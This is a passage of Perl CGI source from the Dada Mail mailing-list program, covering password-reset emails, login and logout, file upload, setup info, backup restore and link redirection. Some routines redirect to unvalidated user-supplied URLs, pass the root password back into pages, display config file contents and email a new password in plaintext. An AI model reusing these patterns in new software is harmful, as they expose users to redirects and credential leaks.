        my $new_encrypt = DADA::Security::Password::encrypt_passwd($new_passwd); 

        $ls->save({
                   password     => $new_encrypt,
                   pass_auth_id => ''
                }); 
        
        
        require DADA::Mail::Send;  
        my $mh = DADA::Mail::Send->new(
			     	{
						-list   => $list, 
						-ls_obj => $ls, 
					}
			     ); 

# DEV This needs to be templated out: 
my $Body = qq{

Hello, 
Someone asked for the $DADA::Config::PROGRAM_NAME List Password password for:

$li->{list_name}
 
to be emailed to this address. Since you are the list owner, 
the password is: 

$new_passwd

Notice, you probably didn't use this password to begin with, 
$DADA::Config::PROGRAM_NAME stores passwords that are encrypted and no 
password it stores can be "unencrypted" 
So, a new, random password is generated. You may reset the password
to anything you want in the list control panel. 

Please be sure to delete this email for security reasons. 

-$DADA::Config::PROGRAM_NAME

};

    
    $mh->send(From    => '"' . escape_for_sending($li->{list_name}) . '" <' . $li->{list_owner_email} . '>', 
              To      => '"List Owner for: '. escape_for_sending($li->{list_name}) .'" <'. $li->{list_owner_email} .'>', 
              Subject => "List Password", 
              Body    => $Body,
             );

        require DADA::Logging::Usage; 
        my $log = new DADA::Logging::Usage; 
           $log->mj_log($list, 'List Password Reset', "remote_host:$ENV{REMOTE_HOST}, ip_address:$ENV{REMOTE_ADDR}") 
                if $DADA::Config::LOG{list_lives};

    
    print $q->redirect(-uri => $DADA::Config::S_PROGRAM_URL . '?flavor=' . $DADA::Config::SIGN_IN_FLAVOR_NAME . '&list=' . $list); 


}else{ 

    require DADA::Mail::Send;  
    my $mh = DADA::Mail::Send->new(
				{
					-list   => $list, 
					-ls_obj => $ls, 
				}
			); 
    
    my $rand_str = DADA::Security::Password::generate_rand_string();
    
    $ls->save({pass_auth_id => $rand_str});
    
# DEV: Um, this has to be templated out one of these years. 
my $Body = qq{ 

Hello, 
Someone asked for the $DADA::Config::PROGRAM_NAME List Password password for:

$li->{list_name}
 
to be emailed to this address. 

Before this can be done, it has to be confirmed that the list
owner (meaning you) actually wants a new password to be set for this list 
and mailed to you. To confirm this, visit this URL: 

$DADA::Config::S_PROGRAM_URL?f=email_password&l=$list&pass_auth_id=$rand_str

By visiting this URL, you will reset the list password. This new 
password will then be emailed to you. You will then be redirected 
to the admin login screen. 

If you do not know why you were sent this email, ignore it and 
your password will not be changed. 

This request for the password change was done from:

    Remote Host:    $ENV{REMOTE_HOST}
    IP Address:    $ENV{REMOTE_ADDR}  

-$DADA::Config::PROGRAM_NAME

}; 

    $mh->send(From     => '"' . escape_for_sending($li->{list_name}) . '" <' . $li->{list_owner_email} . '>', 
              To       =>  '"List Owner for: '. escape_for_sending($li->{list_name}) .'" <'. $li->{list_owner_email} .'>', 
              
              Subject  => "Confirm List Password Change", 
              Body     => $Body
             ); 

        require DADA::Logging::Usage; 
        my $log = new DADA::Logging::Usage; 
           $log->mj_log($list, 'Sent Password Change Confirmation', "remote_host:$ENV{REMOTE_HOST}, ip_address:$ENV{REMOTE_ADDR}") 
                if $DADA::Config::LOG{list_lives};

    
    sleep(10); 
    
    print(list_template(-Part => "header",
                   -Title => "Confirm Password Change", 
                   -List  => $list)); 
    
    print '<p>A confirmation email has been sent to the list owner of ' . $li->{list_name} .
           ' to confirm the password change.</p>
           <ul> 
            <li>
             <p>
              Logged Remote Host: ' . $ENV{REMOTE_HOST} . '</p></li>' .
           '<li><p>Logged Remote IP: ' . $ENV{REMOTE_ADDR} . '</p></li>
           </ul> 
           ';
    
    print(list_template(-Part => "footer",
                   -List  => $list)); 

    }
}




sub login { 

    my $referer        = $q->param('referer')        || $DADA::Config::DEFAULT_ADMIN_SCREEN;
    my $admin_password = $q->param('admin_password') || ""; 
    my $admin_list     = $q->param('admin_list')     || ""; 
    my $auth_state     = $q->param('auth_state')     || undef; 

    my $try_referer = $referer;
    
       $try_referer =~ s/(^http\:\/\/|^https\:\/\/)//; 
       $try_referer =~ s/^www//;       
        
       my $reg_try_referer = quotemeta($try_referer);  
       if($DADA::Config::PROGRAM_URL =~ m/$reg_try_referer$/){ 
            $referer = $DADA::Config::DEFAULT_ADMIN_SCREEN;  
       }
       
    $list = $admin_list;

   if($DADA::Config::DISABLE_OUTSIDE_LOGINS == 1){ 
        require DADA::Security::SimpleAuthStringState; 
        my $sast =  DADA::Security::SimpleAuthStringState->new;  
        if($sast->check_state($auth_state) != 1){ 
            user_error(
				-List  => $list, 
				-Error => 'incorrect_login_url',
			);
            return; 
        }
    }
    
    my $cookie;
    

    if(check_if_list_exists(-List => $list, -dbi_handle => $dbi_handle) >= 1){
               
       require DADA::Security::Password; 
       
        my $dumb_cookie = $q->cookie(-name    => 'blankpadding', 
                                     -value   => 'blank',
                                     %DADA::Config::COOKIE_PARAMS,
                                    ); 
        
        require DADA::App::Session; 
        my $dada_session = DADA::App::Session->new(); 
        
        
        if($dada_session->logged_into_diff_list(-cgi_obj => $q) != 1){ 
        
            my $login_cookie = $dada_session->login_cookie(-cgi_obj => $q, 
                                                           -list    => $list,
                                                           -password => $admin_password); 
            
            require DADA::App::ScreenCache; 
            my $c = DADA::App::ScreenCache->new; 
            $c->remove('login_switch_widget');
       
            if($DADA::Config::LOG{logins}){
                require DADA::Logging::Usage;
                my $log = new DADA::Logging::Usage;
                my $rh = $ENV{REMOTE_HOST} || '';
                my $ra = $ENV{REMOTE_ADDR} || ''; 
                
                $log->mj_log($admin_list, 'login', 'remote_host:' . $rh . ', ip_address:' . $ra);     
            }
                
            print $q->header(-cookie  => [$dumb_cookie, $login_cookie], 
                              -nph     => $DADA::Config::NPH,
                              -Refresh =>'0; URL=' . $referer); 
                    
            print $q->start_html(-title=>'Logging On...',
                                 -BGCOLOR=>'#FFFFFF'
                                ); 
            print $q->p($q->a({-href => $referer}, 'Logging On...')); 
            print $q->end_html();
            
            $dada_session->remove_old_session_files(); 
                    
        }else{ 
        
            user_error(-List  => $list, 
                       -Error => "logged_into_different_list",
                      );    
            return;
        
        }
      
    }else{
        user_error(-List  => $list, 
                   -Error => "no_list",
                  );
        return; 
    }
}




sub logout { 

    my %args = (
		-redirect               => 1, 
        -redirect_url           => $DADA::Config::DEFAULT_LOGOUT_SCREEN, 
        -no_list_security_check => 0,  
    	@_
	); 
                
     my $admin_list;     
     my $root_login;
    
     my $list_exists = check_if_list_exists(-List => $admin_list, -dbi_handle => $dbi_handle); 
     
    # I don't quite even understand why there's this check...
    
    if($args{-no_list_security_check} == 0){     
        if($list_exists == 1){ 
    
            ($admin_list, $root_login) = check_list_security(-cgi_obj  => $q,  
                                                             -Function => 'logout');    
        }
    }


    require DADA::App::ScreenCache; 
    my $c = DADA::App::ScreenCache->new; 
       $c->remove('login_switch_widget');
    
    my $l_list   = $admin_list; 

    my $location = $args{-redirect_url}; 
    
    if($q->param('login_url')){ 
        $location = $q->param('login_url'); 
    }
    
    if ($DADA::Config::LOG{logins} != 0){
    
        require DADA::Logging::Usage;
        my $log = new DADA::Logging::Usage;
           $log->mj_log($l_list, 'logout', "remote_host:$ENV{REMOTE_HOST}, ip_address:$ENV{REMOTE_ADDR}");     
    
    }

    my $logout_cookie; 
   
        require DADA::App::Session; 
        my $dada_session  = DADA::App::Session->new(-List => $l_list); 
           $logout_cookie = $dada_session->logout_cookie(-cgi_obj => $q);
                      
    if($args{-redirect} == 1){ 
    
        print $q->header(-COOKIE       => $logout_cookie, 
                              -nph     => $DADA::Config::NPH,
                              -Refresh =>'0; URL=' . $location,
                            );
        
        print $q->start_html(-title   =>'Logging Out...',
                             -BGCOLOR =>'#FFFFFF'
                            ),
              $q->p($q->a( {-href => $location}, 'Logging Out...')),                  
              $q->end_html(); 
     } else { 
        return $logout_cookie;
     }
   
}



sub log_into_another_list { 

    my ($admin_list, $root_login) = check_list_security(-cgi_obj  => $q,  
                                                        -Function => 'log_into_another_list');
                                                        
    logout(-redirect_url => $DADA::Config::PROGRAM_URL . '?f=' . $DADA::Config::SIGN_IN_FLAVOR_NAME, ); 
    
    return; 

}





sub change_login { 


    my ($admin_list, $root_login) = check_list_security(-cgi_obj  => $q,  
                                                        -Function => 'change_login');

    die "only for root logins!" 
        if ! $root_login;
    
    require DADA::App::Session; 
    my $dada_session = DADA::App::Session->new(); 
    
    my $change_to_list = $q->param('change_to_list'); 
    my $location       = $q->param('location'); 
    
    $q->delete_all();
    
    # DEV: Ooh. This is messy.
    $location =~ s/(\;|\&)done\=1$//;
    $location =~ s/(\;|\&)delete_email_count\=(.*?)$//;
    $location =~ s/(\;|\&)email_count\=(.*?)$//;



    my $new_cookie = $dada_session->change_login(-cgi_obj => $q, -list => $change_to_list);
    
    require DADA::App::ScreenCache; 
    my $c = DADA::App::ScreenCache->new; 
       $c->remove('login_switch_widget'); 
    
    print $q->header(-cookie  => [$new_cookie], 
                      -nph     => $DADA::Config::NPH,
                      -Refresh =>'0; URL=' . $location); 
    print $q->start_html(-title=>'Switching...',
                         -BGCOLOR=>'#FFFFFF'
                        ); 
    print $q->p($q->a({-href => $location}, 'Switching...')); 
    print $q->end_html();
    
}




sub checker { 
    
    # I really don't understand how this subroutine got.. invented. 
    
    my ($admin_list, $root_login) = check_list_security(-cgi_obj  => $q,
                                                        -Function => 'checker');
        
    $list = $admin_list; 
    
    # TODO - why isn't his here? Why aren't we reading it from the pref?!
    
    my $add_to_black_list = $q->param('add_to_black_list') || 0;
    
    my $lh = DADA::MailingList::Subscribers->new({-list => $list});
    my $ls = DADA::MailingList::Settings->new({-list => $list}); 
    my $li = $ls->get; 
    
    my $email_count = $lh->remove_from_list(-Email_List => \@address,
                                            -Type       => $type, 
                                           );
    
    my $should_add_to_black_list = 0; 
        

               
    if($type eq 'list'){ 
        
        if($li->{black_list}               == 1 && 
           $li->{add_unsubs_to_black_list} == 1
           ){ 
             
  			foreach(@address){ 
				$lh->add_subscriber(
					{
						-email => $_, 
						-type  => 'black_list', 
					}
				); 
			}
        }
    }
    
    print $q->redirect(-uri=>"$DADA::Config::S_PROGRAM_URL?flavor=view_list&delete_email_count=$email_count&type=" . $type); 

}



sub find_attachment_type { 

	my $self = shift; 
	
    my $filename = shift; 
    my $a_type; 
        
  my $attach_name =  $filename; 
     $attach_name =~ s!^.*(\\|\/)!!;
     $attach_name =~ s/\s/%20/g;
     
   my $file_ending = $attach_name; 
      $file_ending =~ s/.*\.//;
 
    require MIME::Types; 
    require MIME::Type;

    if(($MIME::Types::VERSION >= 1.005) && ($MIME::Type::VERSION >= 1.005)){ 
        my ($mimetype, $encoding) = MIME::Types::by_suffix($filename);
        $a_type = $mimetype if ($mimetype && $mimetype =~ /^\S+\/\S+$/);  ### sanity check
    }else{ 
        if(exists($DADA::Config::MIME_TYPES{'.'.lc($file_ending)})) {  
            $a_type = $DADA::Config::MIME_TYPES{'.'.lc($file_ending)};
        }else{ 
            $a_type = $DADA::Config::DEFAULT_MIME_TYPE; 
        }
    }
    if(!$a_type){ 
        warn "attachment MIME Type never figured out, letting MIME::Lite handle this..."; 
        $a_type = 'AUTO';
    } 
    
    return $a_type; 
}

sub file_upload {

    my $upload_file = shift; 
    
    my $fu   = CGI->new(); 
    my $file = $fu->param($upload_file);  
    if ($file ne "") {
        my $fileName = $file; 
           $fileName =~ s!^.*(\\|\/)!!;   
         eval {require URI::Escape}; 
         if(!$@){
            $fileName =  URI::Escape::uri_escape($fileName, "\200-\377");
         }else{ 
            warn('no URI::Escape is installed!'); 
         }
        $fileName =~ s/\s/%20/g;
          
        my $outfile = make_safer($DADA::Config::TMP . '/' . time . '_' . $fileName);
         
        open (OUTFILE, '>' . $outfile) or warn("can't write to '" . $outfile . "' because: $!");        
        while (my $bytesread = read($file, my $buffer, 1024)) { 
            print OUTFILE $buffer;
        } 
        close (OUTFILE);
        chmod($DADA::Config::FILE_CHMOD, $outfile);  
        return $outfile;
    }
    
}




sub pass_gen { 

    my $pw = $q->param('pw'); 
    require DADA::Template::Widgets;

    print(list_template(-Part => "header", -Title => "Password Encryption", ,));
    
    if(!$pw){ 
     
        print DADA::Template::Widgets::screen({-screen => 'pass_gen_screen.tmpl', 
                                              -expr   => 1, 
                                              -vars   => {},
                                             });
                     
    }else{

        require DADA::Security::Password; 
        print DADA::Template::Widgets::screen({-screen => 'pass_gen_process_screen.tmpl', 
                                              -expr   => 1, 
                                              -vars   => {
                                                            encrypted_password => DADA::Security::Password::encrypt_passwd($pw), 
                                                          },
                                             });
    }

    print(list_template(-Part => "footer", -End_Form   => 0));

}




sub setup_info { 



    my $root_password = $q->param('root_password') || '';



	if(($DADA::Config::PROGRAM_URL eq "") || ($DADA::Config::PROGRAM_URL eq 'http://www.changetoyoursite.com/cgi-bin/dada/mail.cgi')){ 
				$DADA::Config::PROGRAM_URL =  $ENV{SCRIPT_URI} || $q->url();

	}			

	if(($DADA::Config::S_PROGRAM_URL eq "") || ($DADA::Config::S_PROGRAM_URL eq 'http://www.changetoyoursite.com/cgi-bin/dada/mail.cgi')){ 
				$DADA::Config::S_PROGRAM_URL =  $ENV{SCRIPT_URI} || $q->url();
	}
	    
    if(root_password_verification($root_password) == 1){ 
        my $doc_root   = $ENV{DOCUMENT_ROOT};
		my $pub_html_dir      = $doc_root; 
		   $pub_html_dir      =~ s(^.*/)();
		my $home_dir_guess; 
		my $getpwuid_call; 
		eval { $getpwuid_call = ( getpwuid $> )[7] };
		if(!$@){ 
			$home_dir_guess   = $getpwuid_call; 
		}
		else { 
	    	$home_dir_guess   =~ s/\/$pub_html_dir$//g;
		}
		
		my $config_file_exists    = 0; 
		my $config_file_contents = undef; 
		if(-e $DADA::Config::CONFIG_FILE){ 
			$config_file_exists = 1;
			require DADA::Template::Widgets;  
			$config_file_contents = DADA::Template::Widgets::_slurp($DADA::Config::CONFIG_FILE); 
		}

        my $sendmails = []; 
        if ($DADA::Config::OS !~ /^Win|^MSWin/i){
            push(@$sendmails, {location => $_})
                foreach(split(" ", `whereis sendmail`));
        }


		my $example_config_file_path = undef; 
		if(defined($DADA::Config::CONFIG_FILE)){ 
			$example_config_file_path = $DADA::Config::CONFIG_FILE;
			$example_config_file_path =~ s/\/\.configs\/\.dada_config$//; 
		}
		
		require CGI::Ajax;
		my $scrn = ''; 
		
        $scrn .= list_template(
					   -Part        => "header", 
                       -Title       => "Setup Information",
					   -vars => { 
							PROGRAM_URL   => $DADA::Config::PROGRAM_URL, 
							S_PROGRAM_URL => $DADA::Config::S_PROGRAM_URL, 
						}
                      );
        
        require DADA::Template::Widgets;                
        $scrn .= DADA::Template::Widgets::screen({-screen => 'setup_info_screen.tmpl', 
                                              -vars   => { 
                                                          FILES        => $DADA::Config::FILES, 
                                                          exists_FILES => (-e $DADA::Config::FILES) ? 1 : 0,
                                                          FILES_starts_with_a_slash => ($DADA::Config::FILES =~ m/^\//) ? 1 : 0,
                                                          FILES_ends_in_a_slash     => ($DADA::Config::FILES =~ m/\/$/) ? 1 : 0,
                                                          DOCUMENT_ROOT             => $ENV{DOCUMENT_ROOT}, 
                                                          home_dir_guess            => $home_dir_guess, 
                                                          MAILPROG                  => $DADA::Config::MAILPROG, 
                                                          sendmails                 => $sendmails, 
													      PROGRAM_CONFIG_FILE_DIR   => $DADA::Config::PROGRAM_CONFIG_FILE_DIR, 
														  CONFIG_FILE               => $DADA::Config::CONFIG_FILE,   
														  config_file_exists        => $config_file_exists,
														  config_file_contents      => $config_file_contents, 
														  example_config_file_path  => $example_config_file_path, 
														  PROGRAM_ROOT_PASSWORD     => $root_password, 
														
                                                         },
                                             });

        $scrn .= list_template(-Part => "footer");
		
		print $scrn;
            
    }else{ 

        my $guess = $DADA::Config::PROGRAM_URL; 
           $guess = $q->script_name()
                if $DADA::Config::PROGRAM_URL eq "" || 
                   $DADA::Config::PROGRAM_URL eq 'http://www.changetoyoursite.com/cgi-bin/dada/mail.cgi'; # default.
    
        my $incorrect_root_password = $root_password ? 1 : 0; 
      
        print(list_template(-Part           => 'header', 
                           -Title      => 'Setup Information',
							-vars => {PROGRAM_URL   => $DADA::Config::PROGRAM_URL, 
							S_PROGRAM_URL => $DADA::Config::S_PROGRAM_URL,}, 
                           
                          ));


        require DADA::Template::Widgets;                
        print DADA::Template::Widgets::screen({-screen => 'setup_info_login_screen.tmpl', 
                                              -vars   => { 
                                                          program_url_guess       => $guess,
                                                          incorrect_root_password => $incorrect_root_password, 
														
														PROGRAM_URL           => $DADA::Config::PROGRAM_URL, 
														S_PROGRAM_URL         => $DADA::Config::S_PROGRAM_URL,

														
                                                          
                                                         },
                                             });
                                             
        print(list_template(-Part       => 'footer', 
                       -End_Form   => 0
                    ));
    }

}




sub reset_cipher_keys { 

    my $root_password   = $q->param('root_password');    
    my $root_pass_check = root_password_verification($root_password);
    
    if($root_pass_check == 1){ 
        require DADA::Security::Password; 
        my @lists = available_lists(-dbi_handle => $dbi_handle); 
        
        require DADA::MailingList::Settings; 
        $DADA::MailingList::Settings::dbi_obj = $dbi_handle; 
           
        foreach(@lists){ 
            my $ls = DADA::MailingList::Settings->new({-list => $_}); 
               $ls->save({cipher_key => DADA::Security::Password::make_cipher_key()}); 
        }
        
        print(list_template(-Part  => "header",
                       -Title => "Reset Cipher Keys"));
        print $q->p("Cipher keys have been reset.");
        print(list_template(-Part => "footer"));
        
    }else{ 
        print(list_template(-Part => "header", -Title => "Reset Cipher Keys"));
        
        print $q->p("Please enter the correct $DADA::Config::PROGRAM_NAME Root Password to continue, 
                 every list cipher key will be reset:", $q->br(), 
        $q->hidden('flavor', 'reset_cipher_keys') ,
        $q->password_field('root_password', ''), 
        $q->submit('Continue')),
        $q->p('Why would you want to do this? If you are upgrading Dada Mail 
           from any version under 2.7.1, your list needs a cipher key to encrypt
           sensitive information.');
        
        print(list_template(-Part => "footer"));
    }

}


sub restore_lists { 
    
    if(root_password_verification($q->param('root_password'))){ 
        
        require DADA::MailingList::Settings;
               $DADA::MailingList::Settings::dbi_obj = $dbi_handle; 

        require DADA::MailingList::Archives;
               $DADA::MailingList::Archives::dbi_obj = $dbi_handle;

        require DADA::MailingList::Schedules;
            # No SQL veresion, so don't worry about handing over the dbi handle...
            
        my @lists = available_lists(-dbi_handle => $dbi_handle);
        
        if($process eq 'true'){ 
			
			my $report = ''; 
			
            my %restored; 
            foreach my $r_list(@lists){ 
                if($q->param('restore_'.$r_list.'_settings') && $q->param('restore_'.$r_list.'_settings') == 1){ 
                    my $ls = DADA::MailingList::Settings->new({-list => $r_list});
                       $ls->{ignore_open_db_error} = 1;
                       $report .= $ls->restoreFromFile($q->param('settings_'.$r_list.'_version'));
                }
            }
            foreach my $r_list(@lists){ 
                if($q->param('restore_'.$r_list.'_archives') && $q->param('restore_'.$r_list.'_archives') == 1){ 
                    my $ls = DADA::MailingList::Settings->new({-list => $r_list});
                       $ls->{ignore_open_db_error} = 1;
                    my $la = DADA::MailingList::Archives->new({-list => $r_list, -ignore_open_db_error => 1}); 
                       $report .= $la->restoreFromFile($q->param('archives_'.$r_list.'_version'));
                }
            }
            
            foreach my $r_list(@lists){ 
                if($q->param('restore_'.$r_list.'_schedules') && $q->param('restore_'.$r_list.'_schedules') == 1){ 
                    my $mss = DADA::MailingList::Schedules->new({-list => $r_list, -ignore_open_db_error => 1});
                       $mss->{ignore_open_db_error} = 1;
                       $report .= $mss->restoreFromFile($q->param('schedules_'.$r_list.'_version'));
                }
            }
            
            
            
            
            print(list_template(-Part => "header", -Title => "Restore List Information - Complete"));    
            print $q->p("List Information Restored.");
            print $q->p("<a href=$DADA::Config::PROGRAM_URL>Return to the $DADA::Config::PROGRAM_NAME main page.</a>"); 
            print(list_template(-Part => "footer"));
                        
        }else{ 
            
            my $backup_hist = {}; 
            foreach(@lists){ 
                my $ls = DADA::MailingList::Settings->new({-list => $_});
                   $ls->{ignore_open_db_error} = 1;
                my $la = DADA::MailingList::Archives->new({-list => $_, -ignore_open_db_error => 1});  #yeah, it's diff from MailingList::Settings - I'm stupid.
                
                my $mss = DADA::MailingList::Schedules->new({-list => $_, -ignore_open_db_error => 1}); 

               
                $backup_hist->{$_}->{settings}  = $ls->backupDirs  if $ls->uses_backupDirs;
                $backup_hist->{$_}->{archives}  = $la->backupDirs  if $la->uses_backupDirs;
				# DEV: Is this returning what I think it's supposed to? 
				# Tests have to be written about this...
                $backup_hist->{$_}->{schedules} = $mss->backupDirs 
					if $mss->uses_backupDirs;
            }
            

     		print list_template(
					-Part  => "header", 
					-Title => "Restore List Information"
			);   


            my $restore_list_options = ''; 

            #    labels are for the popup menus, that's it    #                
            my %labels;
            foreach (sort keys %$backup_hist){
                foreach(@{$backup_hist->{$_}->{settings}}){
                    my ($time_stamp, $appended) = ('', '');
                    if($_->{dir} =~ /\./){
                        ($time_stamp, $appended) = split(/\./, $_->{dir}, 2);
                    }
                    else {
                        $time_stamp = $_->{dir};
                    }
					
                    $labels{$_->{dir}} = scalar(localtime($time_stamp)) . ' (' . $_->{count} . ' entries)';
                    
                }
                foreach(@{$backup_hist->{$_}->{archives}}){
                
                    my ($time_stamp, $appended) = ('', '');
                    if($_->{dir} =~ /\./){
                        ($time_stamp, $appended) = split(/\./, $_->{dir}, 2);
                    }
                    else {
                        $time_stamp = $_->{dir};
                    }
                    
                    $labels{$_->{dir}} = scalar(localtime($time_stamp)) . ' (' . $_->{count} . ' entries)';
                    
                }
                foreach(@{$backup_hist->{$_}->{schedules}}){
                
                    my ($time_stamp, $appended) = ('', '');
                    if($_->{dir}  =~ /\./){
                        ($time_stamp, $appended) = split(/\./, $_->{dir}, 2);
                    }
                    else {
                        $time_stamp = $_->{dir};
                    }
                
                    $labels{$_->{dir}} = scalar(localtime($time_stamp)) . ' (' . $_->{count} . ' entries)';
            
                
                }
            }
                                           #
            
            foreach my $f_list(keys %$backup_hist){ 
                
                $restore_list_options .=  $q->start_table({-cellpadding => 5});
                $restore_list_options .= $q->h3($f_list); 
                
                $restore_list_options .=  $q->Tr(
                      $q->td({-valign => 'top'}, [
                            ($q->p($q->strong('Restore?'))), 
                            ($q->p($q->strong('Backup Version*:'))),
                      ]));   
                  
                foreach ('settings', 'archives', 'schedules'){ 
	
		#		require Data::Dumper; 
		#		die Data::Dumper::Dumper(%labels); 
			my $vals = [];
			foreach(@{$backup_hist->{$f_list}->{$_}}){ 
				push(@$vals, $_->{dir});
			}
			
                    $restore_list_options .= $q->Tr(
                          $q->td([
                                ($q->p($q->checkbox(
                                              -name   => 'restore_'.$f_list.'_'.$_,
                                              -id     => 'restore_'.$f_list.'_'.$_,
                                              -value  => 1,
                                              -label  => ' ',
                                             ), '<label for="'. 'restore_'.$f_list.'_'.$_ .'">' . $_ . '</label>' )),
                                
                                
                                (scalar @{$backup_hist->{$f_list}->{$_}}) ? ( 
                                
                                ($q->p($q->popup_menu(
                                                      -name    => $_ . '_' . $f_list . '_version', 
                                                     '-values' => $vals, 
                                                      -labels => {%labels}))),
                                                      
                                ) : (                      
                                                      
                                ($q->p({-class=>'error'}, '-- No Backup Information Found --') ,
                                $q->hidden(-name => $_ . '_' . $f_list . '_version', -value => 'just_remove_blank')),    ),                  
                            ]));  
                }
                $restore_list_options .= '</table>';
            }
            

			require DADA::Template::Widgets; 
			print DADA::Template::Widgets::screen(
					{ 
						-screen => 'restore_lists_options_screen.tmpl', 
						-vars   => {
							restore_list_options => $restore_list_options, 
							root_password        => xss_filter($q->param('root_password')), 
						}
					}
				);
				
                print list_template(-Part => "footer");

        }        
        
    }else{    
		require DADA::Template::Widgets; 
		
        print(list_template(-Part => "header", -Title => "Restore List Information"));
		print DADA::Template::Widgets::screen(
				{
					-screen => 'restore_lists_screen.tmpl', 
				});
        print(list_template(-Part => "footer"));
    }

}




sub subscription_form { 

    require DADA::Template::Widgets; 
    return DADA::Template::Widgets::subscription_form({
        -list => $list,
    });
    
}




sub subscription_form_html {

    print $q->header(); 
    print subscription_form(); 


}




sub subscription_form_js { 
    print $q->header(); 
    my $js_form = js_enc(subscription_form()); 
    print 'document.write(\'' . $js_form . '\');'; 
}





sub clear_screen_cache { 

        if(root_password_verification($q->param('root_password'))){ 
            if($process){ 
                if($process eq 'view'){ 
                    $c->show($q->param('filename')); 
                }elsif($process eq 'remove'){ 
                    $c->remove($q->param('filename')); 
                    run_clear_screen_cache_screen();
                }elsif($process eq 'flush'){ 
                    $c->flush;                    
                    run_clear_screen_cache_screen();

                }

            }else{ 
            
                run_clear_screen_cache_screen();
                
            }
            

        }else{
        
            print(list_template(-Part => "header", -Title => "Screen Cache"));
            print $q->p("Please enter the correct $DADA::Config::PROGRAM_NAME Root Password to manage the screen cache:", $q->br(), 
            $q->hidden('flavor', 'clear_screen_cache') ,
            $q->password_field('root_password', ''), 
            $q->submit('Continue...')) ,
            $q->p($q->strong('No'), 'Changes will be made to your cache files by clicking, &quot;Continue&quot;.');
            print(list_template(-Part => "footer"));
            
        }
        
        
        sub run_clear_screen_cache_screen { 
        
                        my $file_list = $c->cached_screens(); 
                            print(list_template(-Part => "header", -Title => "Screen Cache"));

                
                my $app_file_list = []; 
                
                foreach my $entry(@$file_list){ 
                    $entry->{root_password} = $q->param('root_password');
                    
                    my $cutoff_name = $entry->{name}; 
                    
                        my $l    = length($cutoff_name); 
                        my $size = 50; 
                        my $take = $l < $size ? $l : $size; 
                        $cutoff_name = substr($cutoff_name, 0, $take); 
                        $entry->{cutoff_name} = $cutoff_name; 
                        $entry->{dotdot} = $l < $size ? '' : '...'; 
                    
                    push(@$app_file_list, $entry);    
            
                }
                require DADA::Template::Widgets;
                print   DADA::Template::Widgets::screen({-screen  => 'clear_screen_cache.tmpl', 
                                                          -email  => $email, 
                                                          -vars   => {
                                                          
                                                          file_list     => $app_file_list, 
                                                          root_password => $q->param('root_password'),
                                                          cache_active  =>  $DADA::Config::SCREEN_CACHE eq "1" ? 1 : 0,
                                                          
                                                          },
                                                  }); 


                        print(list_template(-Part => "footer"));

        
        
        }
        

}




sub test_layout { 

    my ($admin_list, $root_login) = check_list_security(-cgi_obj  => $q,  
                                                        -Function => 'test_layout');
                                                        
    print(admin_template_header(-Title      => "Layout Test", 
                            -List       => $admin_list, 
                            -Root_Login => $root_login)); 
                            
    require DADA::Template::Widgets;
    print DADA::Template::Widgets::screen({-screen => 'test_layout_screen.tmpl'}); 
    print(admin_template_footer(-List => $admin_list));

}




sub subscriber_help { 

    if(!$list){ 
        &default; 
        return; 
    }
    
    if(check_if_list_exists(-List => $list, -dbi_handle => $dbi_handle) == 0){ 
        undef($list); 
        &default;
        return;
    }

    require DADA::MailingList::Settings;
           $DADA::MailingList::Settings::dbi_obj = $dbi_handle; 

    my $ls = DADA::MailingList::Settings->new({-list => $list}); 
    my $li = $ls->get;
    
    print(list_template(-Part        => "header",
                   -Title       => "Subscription Help",
                   -List        => $list, 
                   ));

    require DADA::Template::Widgets; 
    print DADA::Template::Widgets::screen({-screen => 'subscriber_help_screen.tmpl',
                                          -vars   => { 
                                                   list             => $list, 
                                                    list_name        => $li->{list_name}, 
                                                   list_owner_email => spam_me_not_encode($li->{list_owner_email}),
                                                    
                                          
                                          
                                          }
    });
    print(list_template(-Part     => "footer",
                   -List     => $list, 
                   ));

    
    
}




sub show_img { 
    
    file_attachment(-inline_image_mode => 1); 
}




sub file_attachment { 
    
    
    # Weird: 
    my ($admin_list, $root_login, $checksout) = check_list_security(-cgi_obj         => $q,  
                                                                    -Function        => 'send_email', 
                                                                   -manual_override => 1
                                                                   );
    
    my %args = (-inline_image_mode => 0, @_); 
    
    if(check_if_list_exists(-List => $list, -dbi_handle => $dbi_handle) == 1){ 
    
        require DADA::MailingList::Settings;
               $DADA::MailingList::Settings::dbi_obj = $dbi_handle; 

        my $ls = DADA::MailingList::Settings->new({-list => $list}); 
        my $li = $ls->get; 
        
        if($li->{show_archives} == 1 || $checksout == 1){ 
        
            if($li->{display_attachments} == 1 || $checksout == 1){ 
            
                require DADA::MailingList::Archives;
                       $DADA::MailingList::Archives::dbi_obj = $dbi_handle;
                       
                my $la = DADA::MailingList::Archives->new({-list => $list}); 

                if($la->can_display_attachments){  
                    
                    if($la->check_if_entry_exists($q->param('id'))){ 
        
                        if($args{-inline_image_mode} == 1){ 
                        
                            if($c->cached('view_inline_attachment.' . $list . '.' . $id . '.' . $q->param('cid'))){ $c->show('view_inline_attachment.' . $list . '.' . $id . '.' . $q->param('cid')); return;}
                                my $scrn =  $la->view_inline_attachment(-id => $q->param('id'), -cid => $q->param('cid')); 
                               # e_print($scrn); 
								print $scrn;
                                $c->cache('view_inline_attachment.' . $list . '.' . $id . '.' . $q->param('cid'), \$scrn);
                                return; 
                        }else{ 
                        
                            my $mode = $q->param('mode'); 
                            
                            if($c->cached('view_file_attachment.' . $list . '.' . $id . '.' . $q->param('filename') . '.' . $mode)){ $c->show('view_file_attachment.' . $list . '.' . $id . '.' . $q->param('filename') . '.' . $mode); return;}
                            my $scrn = $la->view_file_attachment(-id => $q->param('id'), -filename => $q->param('filename'), -mode => $mode); 
                            #e_print($scrn); 
							print $scrn; 
                            $c->cache('view_file_attachment.' . $list . '.' . $id . '.' . $q->param('filename') . '.' . $mode, \$scrn);

                            
                        }
                        
                    } else { 
                    
                        user_error(-List => $list, -Error => "no_archive_entry");
                        return;
                    }
                    
                } else { 
                
                    user_error(-List => $list, -Error => "no_display_attachments");
                    return; 
                }
                
            } else { 
            
                user_error(-List => $list, -Error => "no_display_attachments");
                return; 
            }
            
        } else { 

            user_error(-List => $list, -Error => "no_show_archives");
            return; 
        }
        
    } else { 
    
        user_error(-List => $list, -Error => 'no_list');
        return; 
    }
    
}




sub redirection { 

    require DADA::Logging::Clickthrough; 
    my $r = DADA::Logging::Clickthrough->new({-list => $q->param('list')}); 

	if(defined($q->param('key'))){ 
		
		my ($mid, $url) = $r->fetch($q->param('key')); 

		   if(defined($mid) && defined($url)){ 
	       		$r->r_log($mid, $url);
			}
	    if($url){ 
	        print $q->redirect(-uri => $url);
	    	return;
